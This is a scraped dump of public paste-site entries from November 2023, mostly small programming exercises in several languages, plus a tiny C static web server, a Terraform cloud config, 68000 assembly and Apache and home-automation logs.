                ""view array : outputs the contents of the current array\n"" +
                ""start sort : starts sorting the array\n"" +
                ""exit : breaks the program\n"");
    }
}
class Sort {
    static Scanner in = new Scanner(System.in);
    public static void insertionSort(array m) throws IOException{
        System.out.print(""Enter option (>, <): "");
        String option = in.next();
        while (!option.equals("">"") && !option.equals(""<"") && !option.equals("">="") && !option.equals(""<="")) {
            System.out.print(""Unknown command X(\n> "");
            option = in.next();
        }
        System.out.print(""!!!Indexing starts with 1!!!\n"");
        System.out.print(""Enter start index: "");
        int start = in.nextInt();
        System.out.print(""Enter end index: "");
        int stop = in.nextInt();
        int ind = start, temp = m.getElement(ind);
        while (ind < stop) {
            temp = m.getElement(ind);
            for (int i = ind; i >= start - 1; --i) {
                if (i == start - 1) {
                    m.changeElement(i, temp);
                } else
                    switch (option) {
                        case ("">""):
                            if (m.getElement((i - 1)) > temp) {
                                m.swapElements((i - 1), i);
                            }
                            else {
                                m.changeElement(i, temp);
                                break;
                            }
                        break;
                        case (""<""):
                            if (m.getElement((i - 1)) < temp) {
                                m.swapElements((i - 1), i);
                            }
                            else {
                                m.changeElement(i, temp);
                                break;
                            }
                        break;
                    }
            }
            ind++;
        }
        System.out.print(""Sort has been completed successfully!\n"");
    }
}
class array{
    Scanner in = new Scanner(System.in);
    static int size;
    static int[] nums;
    static String name;
    private actions input = new actions();
    static boolean created = false, elements = false;
    {
        this.size = 0;
        name = ""null"";
        created = true;
        elements = false;
        System.out.print(""array created successfully!\n"");
    }
    public void createArray() throws IOException {
        setName();
        setSize();
        nums = new int[size];
        setElements();
    }
    public void setElements() throws IOException {
        if (!elements) {
            System.out.print(""Enter new elements of "" + name + "": "");
            elements = true;
            for (int i = 0; i < size; ++i) {
                nums[i] = in.nextInt();
            }
            System.out.print(""The array has been filled successfully!\n"");
        }
        else {
            System.out.print(""The array is already filled. Do you want to fill it out again? [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                System.out.print(""Enter new elements of "" + name + "": "");
                elements = true;
                for (int i = 0; i < size; ++i) {
                    nums[i] = in.nextInt();
                }
                System.out.print(""The array has been filled successfully!\n"");
            }
        }
    }
    public void setSize() throws IOException{
        System.out.print(""Enter new size of "" + name + "": "");
        int size = in.nextInt();
        if (this.size == 0) {
            this.size = size;
            System.out.print(""New size of array: "" + this.size + ""\n"");
        }
        else {
            System.out.print(""The size of the array has already been set. do you want to change it?"" +
                    "" (this will destroy all the elements!) [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                this.size = size;
                elements = false;
                System.out.print(""New size of array: "" + this.size + ""\n"");
            }
        }
        nums = new int[this.size];

    }
    public void setName() throws IOException{
        System.out.print(""Enter the new name of array: "");
        String name = in.next();
        while (name.equals(""null"")) {
            System.out.print(""You cannot use this name!\nEnter the new name of array: "");
            name = in.next();
        }
        if (this.name.equals(""null"")) {
            this.name = name;
            System.out.print(""New name of array: "" + this.name + ""\n"");
        }
        else {
            System.out.print(""The array already has a name. Are you sure you want to rename it? [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                this.name = name;
                System.out.print(""New name of mass: "" + this.name + ""\n"");
            }
        }
    }
    public int getSize() {
        return this.size;
    }
    public int getElement(int ind) {
        return nums[ind];
    }
    public boolean getStatus() {
        return created;
    }
    public int[] getArray() {
        return this.nums;
    }
    public void changeElement(int ind, int temp) {
        nums[ind] = temp;
        return;
    }
    public void swapElements(int l, int r) {
        int temp = nums[l];
        nums[l] = nums[r];
        nums[r] = temp;
        return;
    }
    public void displayArray() {
        System.out.print(""Name of array: "" + name +
                ""\nSize of array: "" + size +
                ""\nElements of array: "");
        for (int i = 0; i < size; ++i)
            System.out.print(nums[i] + "" "");
        System.out.print(""\n"");
    }
    public void notCreated() {
        created = false;
    }
}"
LwPZWt6V,02. Treasure Hunt,Spocoman,Python,Friday 10th of November 2023 03:28:55 AM CDT,"chest = input().split('|')
command = input()

while command != ""Yohoho!"":
    tokens = command.split(' ')
    command = tokens[0]
    if command == ""Loot"":
        for i in range(1, len(tokens)):
            if tokens[i] not in chest:
                chest.insert(0, tokens[i])
    elif command == ""Drop"":
        index = int(tokens[1])
        if 0 <= index < len(chest):
            chest.append(chest.pop(index))
    elif command == ""Steal"":
        count = int(tokens[1])
        stolen_chest = chest[-count:]
        chest = chest[: - count]
        print("", "".join(stolen_chest))

    command = input()

if len(chest) == 0:
    print(""Failed treasure hunt."")
else:
    average_gain = len(''.join(chest)) / len(chest)
    print(f""Average treasure gain: {average_gain:.2f} pirate credits."")
"
WLfWaCCy,EsRebecca,robyzan,C++,Friday 10th of November 2023 03:26:50 AM CDT,"#include<iostream>
using namespace std;
int main()
{
	int data1,data2;
	cout<<""scrivi una data1 con g,m,a""<<endl;
	cin>>data1;
	cout<<""scrivi una data2 con g,m,a""<<endl;
	cin>>data2;
	
	if (data1>data2)
	{
		cout<<""data piu' recente""<<endl;
	}
	else 
	cout<<""data meno recente""<<endl;
        
	return 0;
}"
M2K1TvuZ,01. Black Flag,Spocoman,Python,Friday 10th of November 2023 03:13:06 AM CDT,"days = int(input())
daily_plunder = int(input())
expected_plunder = float(input())
total_plunder = 0.0

for i in range(1, days + 1):
    total_plunder += daily_plunder
    if i % 3 == 0:
        total_plunder += daily_plunder * 0.5
    if i % 5 == 0:
        total_plunder *= 0.7

if total_plunder >= expected_plunder:
    print(f""Ahoy! {total_plunder:.2f} plunder gained."")
else:
    print(f""Collected only {total_plunder / expected_plunder * 100:.2f}% of the plunder."")
"
6Y4cuEg2,01. Black Flag,Spocoman,JavaScript,Friday 10th of November 2023 02:54:14 AM CDT,"function blackFlag(input) {
    let days = Number(input[0]);
    let dailyPlunder = Number(input[1]);
    let expectedPlunder = Number(input[2]);
    let totalPlunder = 0;

    for (let i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        console.log(`Ahoy! ${totalPlunder.toFixed(2)} plunder gained.`);
    } else {
        console.log(`Collected only ${(totalPlunder / expectedPlunder * 100).toFixed(2)}% of the plunder.`);
    }
	return;
}"
GW7ps5Br,Leetcode course task #2722 (very cool),tankalxat34,TypeScript,Friday 10th of November 2023 02:50:47 AM CDT,"type JSONValue = null | boolean | number | string | JSONValue[] | { [key: string]: JSONValue };
type TaskObj = {
    id: number
    [key: string]: any
} | any

function join(arr1: JSONValue[] | TaskObj, arr2: JSONValue[] | TaskObj): JSONValue[] {
    const result: any = {};

    for (let obj of arr1) {
        result[obj.id] = obj;
    }

    for (let obj of arr2) {
        if (result[obj.id]) {
            for (let key in obj) {
                result[obj.id][key] = obj[key];
            }
        } else {
            result[obj.id] = obj;
        }
    }

    return Object.values(result) as JSONValue[];
};"
UmYMHJjy,01. Black Flag,Spocoman,C++,Friday 10th of November 2023 02:48:24 AM CDT,"#include <iostream>
#include<iomanip>

using namespace std;

int main() {
    int days, dailyPlunder;
    cin >> days >> dailyPlunder;

    double expectedPlunder, totalPlunder = 0;
    cin >> expectedPlunder;

    for (int i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        cout << ""Ahoy! "" << fixed << setprecision(2) << totalPlunder << "" plunder gained.\n"";
    }
    else {
        double percentage = totalPlunder / expectedPlunder * 100;
        cout << ""Collected only "" << fixed << setprecision(2) << percentage << ""% of the plunder.\n"";
    }
    return 0;
}"
X3BDQxtQ,01. Black Flag,Spocoman,C#,Friday 10th of November 2023 02:35:08 AM CDT,"using System;

namespace BlackFlag
{
    class Program
    {
        static void Main(string[] args)
        {
            int days = int.Parse(Console.ReadLine());
            int dailyPlunder = int.Parse(Console.ReadLine());
            double expectedPlunder = double.Parse(Console.ReadLine());
            double totalPlunder = 0;

            for (int i = 1; i <= days; i++)
            {
                totalPlunder += dailyPlunder;
                if (i % 3 == 0)
                {
                    totalPlunder += dailyPlunder * 0.5;
                }
                if (i % 5 == 0)
                {
                    totalPlunder *= 0.7;
                }
            }

            if (totalPlunder >= expectedPlunder)
            {
                Console.WriteLine($""Ahoy! {totalPlunder:f2} plunder gained."");
            }
            else
            {
                double percentage = totalPlunder / expectedPlunder * 100;
                Console.WriteLine($""Collected only {percentage:f2}% of the plunder."");
            }
        }
    }
}
"
wjUzQqzu,Leetcode course task #2722 (by spread approach),tankalxat34,TypeScript,Friday 10th of November 2023 02:24:23 AM CDT,"type JSONValue = null | boolean | number | string | JSONValue[] | { [key: string]: JSONValue };
type TaskValue = {
    id: number;
    [key: string]: any;
} | JSONValue | JSONValue[] | { [key: string]: any } | any;

function join(arr1: JSONValue[], arr2: JSONValue[]): JSONValue[] {
    let merged: JSONValue[] = [...arr1, ...arr2];
    let ids = merged.map((value: TaskValue) => value.id);
    let tmp: { [key: number]: Object } = {};

    for (let i: number = 0; i < ids.length; i++) {
        const id: number = ids[i];
        const obj: TaskValue = merged[i];

        if (typeof tmp[id] !== ""object"") {
            tmp[id] = {
                ...(obj as Object),
            };
        } else {
            tmp[id] = {
                ...(tmp[id] as Object),
                ...(obj as Object),
            };
        }
    }

    return Object.values(tmp) as JSONValue[];
}
"
WcZr5rCL,not yet tested contigus routine,glokyfull,Motorola 68000 HiSoft Dev,Friday 10th of November 2023 02:11:25 AM CDT,"
createContigustable
;
; a0 = ram
; d0 = nombre d'element de la table sinus
; d1 = pas interne
; d2 = nombre de copie de valeurs
; a3 = table de sinus d'amplitude final
;
; pendant le fonctionnement:
; constante  d3,d4,d5 = pas interne,*2,*4
;

; retour:
; a0 = ram
; a1 = adresse table de d0 adresses  reftable pris a partir de la ram
;  


	move.l a0,a1		; a1 = table refsin
	move.w d0,d3
	add.w d3,d3		; *2
	move.l a3,a4
	add d3,a4
	add.w d3,d3		; *4
	add.w d3,a0			; a0 =ram
	
	move.l a3,a4


	lea tempbuffer,a2
	move.w d0,d4
	lsr #2,d4
	moveq #0,d3
.clearFlag
	move.l d3,(a2)+
	dbf d4,.clearFlag	; +- 4 octet

	lea tempbuffer,a2
	move.l a2,a5
	add.w d0,a5
	add.w d0,a5			; a5 = fin tempbuffer


	;moveq #0,d5			; angle
	
	move.w d1,d3		; pas interne<>0
	move.w d3,d4
	add d4,d4			; pas interne*2
	move.w d4,d5
	add.w d5,d5			; pas interne*4
	neg.w d0
	move.w d0,.auto1+2			; nombre d'elements
	add.w d0,d0
	move.w d0,.auto2+2
	move.w d0,.auto2b+2
	add.w d0,d0
	move.w d0,.auto3+2
;----------------------------------------
.loop
	move.w (a3),d7
	tst.b (a2)
	bne.s .flaga1
	st.b (a2)
	move.l a0,(a1)		; on stoque l'adresse de la valeur dans table refsin
	move.w d7,(a0)+
	; on met a jour a3 avec le pas interne*2
	; on met a jour a2 avec le pas interne (flags)
	add.w d3,a2
	add.w d4,a3
	add.w d5,a1

	cmp.l a2,a5
	blt.s .loop
.auto1
	lea 0(a2),a2
.auto2
	lea 0(a3),a3
.auto3
	lea 0(a1),a1
	bra.s .loop
.flaga1
	move.w d2,d6		; nombre de copie
	subq.w #1,d6

	move.l a3,-(sp)
.cpy
	move.w d7,(a0)+
	add.w d4,a3
	cmp.l a3,a4
	blt.s .1
.auto2b
	lea 0(a3),a3

.1
	move.w (a3),d7
	dbf d6,.cpy
	move.l (sp)+,a3

	addq.w #1,a2
	addq.w #2,a3
	addq.w #4,a1
	tst.b (a2)
	bne.s .fin
	bra.s .loop
.fin
	rts	
	BSS

	even
tempbuffer
	ds.w 4096 ; max 8192 elements
	ds.l 1

"
N1GSrXtU,Untitled,chemelli74,Python,Friday 10th of November 2023 02:03:32 AM CDT,"
2023-11-09 20:33:01.967 DEBUG (MainThread) [aiocomelit] GET page /user/action.cgi?type=light&num1=8 [192.168.1.252:80]

2023-11-09 20:33:02.622 DEBUG (MainThread) [aiocomelit] GET response 1 [192.168.1.252:80]

2023-11-09 20:33:02.690 DEBUG (MainThread) [aiocomelit] List of devices of type light: {'num': 25, 'desc': ['Disimpegno Muretto', 'Disimpegno Ingresso', 'Sala Zona Pranzo', 'Sala Zona Giorno', 'Cucina Zona Tavolo', 'Cucina Zona Lavello', 'Cucina Zona Fornelli', 'Cucina Zona Frigo', 'Studio', 'Camera Natalia', 'Camera Axel &amp; Arazka', 'Camera Matrimoniale', 'Bagno Servizio', 'Bagno Bimbi', 'Bagno Matrimoniale', 'Disimpegno Bagno Ser', 'Disimpegno Scale', 'Disimpegno Matrimoni', 'Scale', 'Fronte Casa', 'Retro Casa', 'Fari Tettoia', 'Auto/Ambient', 'Balcone Frontale', 'Balcone Retro'], 'env': [1, 1, 2, 2, 3, 3, 3, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 15, 16, 16, 17, 18], 'status': [0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0], 'val': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], 'type': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0], 'protected': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], 'env_desc': ['', 'Ingresso', 'Sala', 'Cucina', 'Studio', 'Camera Natalia', 'Camera Axel &amp; Arazka', 'Camera Matrimoniale', 'Bagno Servizio', 'Bagno Bimbi', 'Bagno Matrimoniale', 'Disimpegno Bagno Ser', 'Disimpegno Scale', 'Disimpegno Matrimoni', 'Scale', 'Esterno', 'Tettoia Garage', 'Balcone Frontale', 'Balcone Retro', 'Locale Tecnico']}

"
VYmZkVE8,Untitled,RocknRollGlue,C#,Friday 10th of November 2023 02:02:09 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
 
namespace KrydsOgBolle
{
    class KrydsOgBolle
    {
        char[] board = new char[9] { '1', '2', '3', '4', '5', '6','7', '8', '9'};
        static void Main(string[] args)
        {
            //Lav et program, der opretter et 3 x 3 array og bed brugeren om at vælge en celle og værdi [X eller O]
            //Udlæs derefter arrayet korrekt
 
            string player1 = ""X"", player2 = ""O"";
 
            Console.Write(""Player 1, please write your name: "");
            player1 = Console.ReadLine();
            Console.Write(""Player 2, please write your name: "");
            player2 = Console.ReadLine();
            PrintBoard();
        }

        static void PrintBoard(){
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[1], board[2], board[3]);
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[4], board[5], board[6]);
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[7], board[8], board[9]);
            Console.WriteLine(""     |     |     "");

        }


    }
}
 "
uBHwVYUd,Untitled,RocknRollGlue,C#,Friday 10th of November 2023 02:00:36 AM CDT,"
static void PrintBoard(){
    char[] board = new char[9] { '1', '2', '3', '4', '5', '6','7', '8', '9'};
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[1], board[2], board[3]);
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[4], board[5], board[6]);
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[7], board[8], board[9]);
    Console.WriteLine(""     |     |     "");

}"
1Cnx7wmW,WEB server,opencard,C,Friday 10th of November 2023 01:33:15 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define VERSION 23
#define BUFSIZE 8096
#define ERROR      42
#define LOG        44
#define FORBIDDEN 403
#define NOTFOUND  404

struct {
    char *ext;
    char *filetype;
} extensions [] = {
    {""gif"", ""image/gif"" },  
    {""jpg"", ""image/jpg"" }, 
    {""jpeg"",""image/jpeg""},
    {""png"", ""image/png"" },  
    {""ico"", ""image/ico"" },  
    {""zip"", ""image/zip"" },  
    {""gz"",  ""image/gz""  },  
    {""tar"", ""image/tar"" },  
    {""htm"", ""text/html"" },  
    {""html"",""text/html"" },  
    {""json"",""application/json"" },  
    {0,0} };

void logger(int type, char *s1, char *s2, int socket_fd)
{
    int fd ;
    char logbuffer[BUFSIZE*2];

    switch (type) {
    case ERROR: (void)sprintf(logbuffer,""ERROR: %s:%s Errno=%d exiting pid=%d"",s1, s2, errno,getpid()); 
        break;
    case FORBIDDEN: 
        (void)write(socket_fd, ""HTTP/1.1 403 Forbidden\nContent-Length: 185\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\nThe requested URL, file type or operation is not allowed on this simple static file webserver.\n</body></html>\n"",271);
        (void)sprintf(logbuffer,""FORBIDDEN: %s:%s"",s1, s2); 
        break;
    case NOTFOUND: 
        (void)write(socket_fd, ""HTTP/1.1 404 Not Found\nContent-Length: 136\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\nThe requested URL was not found on this server.\n</body></html>\n"",224);
        (void)sprintf(logbuffer,""NOT FOUND: %s:%s"",s1, s2); 
        break;
    case LOG: (void)sprintf(logbuffer,"" INFO: %s:%s:%d"",s1, s2,socket_fd); break;
    }
    if((fd = open(""web.log"", O_CREAT| O_WRONLY | O_APPEND,0644)) >= 0) {
        (void)write(fd,logbuffer,strlen(logbuffer)); 
        (void)write(fd,""\n"",1);      
        (void)close(fd);
    }
    if(type == ERROR || type == NOTFOUND || type == FORBIDDEN) exit(3);
}

void web(int fd, int hit)
{
    int j, file_fd, buflen;
    long i, ret, len;
    char * fstr;
    static char buffer[BUFSIZE+1];

    ret =read(fd,buffer,BUFSIZE);
    if(ret == 0 || ret == -1) {
        logger(FORBIDDEN,""failed to read browser request"","""",fd);
    }
    if(ret > 0 && ret < BUFSIZE)
        buffer[ret]=0;
    else buffer[0]=0;
    for(i=0;i<ret;i++)
        if(buffer[i] == '\r' || buffer[i] == '\n')
            buffer[i]='*';
    logger(LOG,""request"",buffer,hit);
    if( strncmp(buffer,""GET "",4) && strncmp(buffer,""get "",4) ) {
        logger(FORBIDDEN,""Only simple GET operation supported"",buffer,fd);
    }
    for(i=4;i<BUFSIZE;i++) {
        if(buffer[i] == ' ') {
            buffer[i] = 0;
            break;
        }
    }
    for(j=0;j<i-1;j++)
        if(buffer[j] == '.' && buffer[j+1] == '.') {
            logger(FORBIDDEN,""Parent directory (..) path names not supported"",buffer,fd);
        }
    if( !strncmp(&buffer[0],""GET /\0"",6) || !strncmp(&buffer[0],""get /\0"",6) )
        (void)strcpy(buffer,""GET /index.html"");
    buflen=strlen(buffer);
    fstr = (char *)0;
    for(i=0;extensions[i].ext != 0;i++) {
        len = strlen(extensions[i].ext);
        if( !strncmp(&buffer[buflen-len], extensions[i].ext, len)) {
            fstr =extensions[i].filetype;
            break;
        }
    }
    if(fstr == 0) logger(FORBIDDEN,""file extension type not supported"",buffer,fd);

    if(( file_fd = open(&buffer[5],O_RDONLY)) == -1) {
        logger(NOTFOUND, ""failed to open file"",&buffer[5],fd);
    }
    logger(LOG,""SEND"",&buffer[5],hit);
    len = (long)lseek(file_fd, (off_t)0, SEEK_END);
          (void)lseek(file_fd, (off_t)0, SEEK_SET);
          (void)sprintf(buffer,""HTTP/1.1 200 OK\nServer: web/%d.0\nContent-Length: %ld\nConnection: close\nContent-Type: %s\n\n"", VERSION, len, fstr);
    logger(LOG,""Header"",buffer,hit);
    (void)write(fd,buffer,strlen(buffer));
    while (    (ret = read(file_fd, buffer, BUFSIZE)) > 0 ) {
        (void)write(fd,buffer,ret);
    }
    sleep(1);
    close(fd);
    exit(1);
}

int main(int argc, char **argv)
{
    int i, port, pid, listenfd, socketfd, hit;
    socklen_t length;
    static struct sockaddr_in cli_addr;
    static struct sockaddr_in serv_addr;

    if( argc < 3  || argc > 3 || !strcmp(argv[1], ""-?"") ) {
        (void)printf(""V: "", VERSION);
        for(i=0;extensions[i].ext != 0;i++)
            (void)printf("" %s"",extensions[i].ext);

        (void)printf(""\n\tNot Supported"");
        exit(0);
    }
    if( !strncmp(argv[2],""/""   ,2 ) || !strncmp(argv[2],""/etc"", 5 ) ||
        !strncmp(argv[2],""/bin"",5 ) || !strncmp(argv[2],""/lib"", 5 ) ||
        !strncmp(argv[2],""/tmp"",5 ) || !strncmp(argv[2],""/usr"", 5 ) ||
        !strncmp(argv[2],""/dev"",5 ) || !strncmp(argv[2],""/sbin"",6) ){
        (void)printf(""ERROR: Bad top directory %s, see web -?\n"",argv[2]);
        exit(3);
    }
    if(chdir(argv[2]) == -1){ 
        (void)printf(""ERROR: Can't Change to directory %s\n"",argv[2]);
        exit(4);
    }
    if(fork() != 0)
        return 0;
    (void)signal(SIGCHLD, SIG_IGN);
    (void)signal(SIGHUP, SIG_IGN);
    for(i=0;i<32;i++)
        (void)close(i);
    (void)setpgrp();
    logger(LOG,""web starting"",argv[1],getpid());
    if((listenfd = socket(AF_INET, SOCK_STREAM,0)) <0)
        logger(ERROR, ""system call"",""socket"",0);
    port = atoi(argv[1]);
    if(port < 0 || port >60000)
        logger(ERROR,""Invalid port number (try 1->60000)"",argv[1],0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(port);
    if(bind(listenfd, (struct sockaddr *)&serv_addr,sizeof(serv_addr)) <0)
        logger(ERROR,""system call"",""bind"",0);
    if( listen(listenfd,64) <0)
        logger(ERROR,""system call"",""listen"",0);
    for(hit=1; ;hit++) {
        length = sizeof(cli_addr);
        if((socketfd = accept(listenfd, (struct sockaddr *)&cli_addr, &length)) < 0)
            logger(ERROR,""system call"",""accept"",0);
        if((pid = fork()) < 0) {
            logger(ERROR,""system call"",""fork"",0);
        }
        else {
            if(pid == 0) {
                (void)close(listenfd);
                web(socketfd,hit);
            } else {
                (void)close(socketfd);
            }
        }
    }
}
//~ gcc -O -DLINUX web.c -o web
"
Dex9MfWx,k8s-node-pool-container_network_type,zradeg,YAML,Friday 10th of November 2023 01:08:26 AM CDT,"resource ""sbercloud_vpc"" ""infra_vpc"" {
name = ""vpc""
cidr                  = ""10.26.4.0/24""
enterprise_project_id = ""9a4612b8-5a9c-4b14-be9f-c9c53acfb18a""
region                = ""ru-moscow-1""
}

resource ""sbercloud_vpc_subnet"" ""infra_subnet_1"" {
vpc_id        = sbercloud_vpc.infra_vpc.id
name          = ""subnet-1""
cidr          = ""10.26.4.0/24""
dns_list          = [""10.26.4.50""]
ipv6_enable       = false
gateway_ip    = ""10.26.4.1""
primary_dns   = ""10.26.4.50""
region            = ""ru-moscow-1""
}

resource ""sbercloud_network_acl_rule"" ""infra_rule_allow_all"" {
name             = ""allow-all-rule""
description      = ""allow all traffic""
action           = ""allow""
protocol         = ""any""
enabled          = ""true""
}

resource ""sbercloud_network_acl"" ""infra_fw_acl"" {
name          = ""fw-acl""
subnets       = [sbercloud_vpc_subnet.infra_subnet_1.id]
inbound_rules = [
sbercloud_network_acl_rule.infra_rule_allow_all.id,
]
outbound_rules = [
sbercloud_network_acl_rule.infra_rule_allow_all.id
]
}
resource ""sbercloud_cce_cluster"" ""infra_cluster"" {
name                   = ""cluster""
flavor_id              = ""cce.s2.small""
vpc_id                 = sbercloud_vpc.infra_vpc.id
subnet_id              = sbercloud_vpc_subnet.infra_subnet_1.id
container_network_type = ""overlay_l2""
container_network_cidr = ""10.99.0.0/18""
service_network_cidr   = ""10.99.64.0/18""
authentication_mode    = ""rbac""
masters {
availability_zone    = ""ru-moscow-1a""
}
masters {
availability_zone    = ""ru-moscow-1b""
}
masters {
availability_zone    = ""ru-moscow-1c""
}
}

resource ""sbercloud_cce_node_pool"" ""infra_node_pool"" {
cluster_id               = sbercloud_cce_cluster.infra_cluster.id
name                     = ""node-pool""
os                       = ""Ubuntu 18.04""
initial_node_count       = 3
flavor_id                = ""c6.xlarge.2""
scall_enable             = true
min_node_count           = 3
max_node_count           = 6
scale_down_cooldown_time = 100
priority                 = 1
type                     = ""vm""
password                 = data.sops_file.secrets.data[""k8s.node_pass""]

root_volume {
size       = 40
volumetype = ""SSD""
}
data_volumes {
size       = 100
volumetype = ""SSD""
}
}"
n6VyY3RG,WBS Apache Error Log 6-10 Nov 2023,frmnqodry,Apache Log,Friday 10th of November 2023 01:05:40 AM CDT,"[Mon Nov 06 09:53:47.127956 2023] [ssl:warn] [pid 2456:tid 500] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Mon Nov 06 09:53:47.299834 2023] [core:warn] [pid 2456:tid 500] AH00098: pid file C:/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
[Mon Nov 06 09:53:47.299834 2023] [ssl:warn] [pid 2456:tid 500] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Mon Nov 06 09:53:50.706081 2023] [mpm_winnt:notice] [pid 2456:tid 500] AH00455: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.0.23 configured -- resuming normal operations
[Mon Nov 06 09:53:50.706081 2023] [mpm_winnt:notice] [pid 2456:tid 500] AH00456: Apache Lounge VS16 Server built: Jun 22 2022 09:58:15
[Mon Nov 06 09:53:50.706081 2023] [core:notice] [pid 2456:tid 500] AH00094: Command line: 'C:\\xampp\\apache\\bin\\httpd.exe -d C:/xampp/apache'
[Mon Nov 06 09:53:50.706081 2023] [mpm_winnt:notice] [pid 2456:tid 500] AH00418: Parent: Created child process 4696
[Mon Nov 06 09:53:51.112331 2023] [ssl:warn] [pid 4696:tid 508] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Mon Nov 06 09:53:51.143582 2023] [ssl:warn] [pid 4696:tid 508] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Mon Nov 06 09:53:51.159207 2023] [mpm_winnt:notice] [pid 4696:tid 508] AH00354: Child: Starting 150 worker threads.
[Wed Nov 08 16:07:28.085361 2023] [ssl:warn] [pid 2628:tid 500] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Wed Nov 08 16:07:28.335379 2023] [core:warn] [pid 2628:tid 500] AH00098: pid file C:/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
[Wed Nov 08 16:07:28.335379 2023] [ssl:warn] [pid 2628:tid 500] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Wed Nov 08 16:07:30.804113 2023] [mpm_winnt:notice] [pid 2628:tid 500] AH00455: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.0.23 configured -- resuming normal operations
[Wed Nov 08 16:07:30.804113 2023] [mpm_winnt:notice] [pid 2628:tid 500] AH00456: Apache Lounge VS16 Server built: Jun 22 2022 09:58:15
[Wed Nov 08 16:07:30.804113 2023] [core:notice] [pid 2628:tid 500] AH00094: Command line: 'C:\\xampp\\apache\\bin\\httpd.exe -d C:/xampp/apache'
[Wed Nov 08 16:07:30.804113 2023] [mpm_winnt:notice] [pid 2628:tid 500] AH00418: Parent: Created child process 4636
[Wed Nov 08 16:07:31.194737 2023] [ssl:warn] [pid 4636:tid 524] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Wed Nov 08 16:07:31.225986 2023] [ssl:warn] [pid 4636:tid 524] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Wed Nov 08 16:07:31.241613 2023] [mpm_winnt:notice] [pid 4636:tid 524] AH00354: Child: Starting 150 worker threads.
[Fri Nov 10 13:45:16.242974 2023] [ssl:warn] [pid 3156:tid 540] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Fri Nov 10 13:45:16.352355 2023] [core:warn] [pid 3156:tid 540] AH00098: pid file C:/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
[Fri Nov 10 13:45:16.352355 2023] [ssl:warn] [pid 3156:tid 540] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Fri Nov 10 13:45:18.977347 2023] [mpm_winnt:notice] [pid 3156:tid 540] AH00455: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.0.23 configured -- resuming normal operations
[Fri Nov 10 13:45:18.977347 2023] [mpm_winnt:notice] [pid 3156:tid 540] AH00456: Apache Lounge VS16 Server built: Jun 22 2022 09:58:15
[Fri Nov 10 13:45:18.977347 2023] [core:notice] [pid 3156:tid 540] AH00094: Command line: 'C:\\xampp\\apache\\bin\\httpd.exe -d C:/xampp/apache'
[Fri Nov 10 13:45:18.977347 2023] [mpm_winnt:notice] [pid 3156:tid 540] AH00418: Parent: Created child process 4656
